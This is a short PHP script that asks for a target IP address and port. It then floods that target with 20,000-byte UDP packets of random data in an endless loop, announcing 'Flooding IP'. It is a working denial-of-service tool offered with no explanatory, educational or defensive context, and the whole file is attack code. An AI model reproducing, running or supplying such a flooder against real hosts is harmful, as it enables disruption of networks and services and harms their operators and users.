<?php
error_reporting(-0);
$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

echo "\n";
$ip = readline("IP : ");
$port = readline("Port : ");
$packets = random_bytes(20000);
$len = strlen($packets);

echo "----------------";
echo "Flooding IP ==>"." ".$ip." "."Port ==>"." ".$port;
echo "----------------";
while(true)
{
 socket_sendto($sock, $packets, $len, 0, $ip , $port);
}
?>
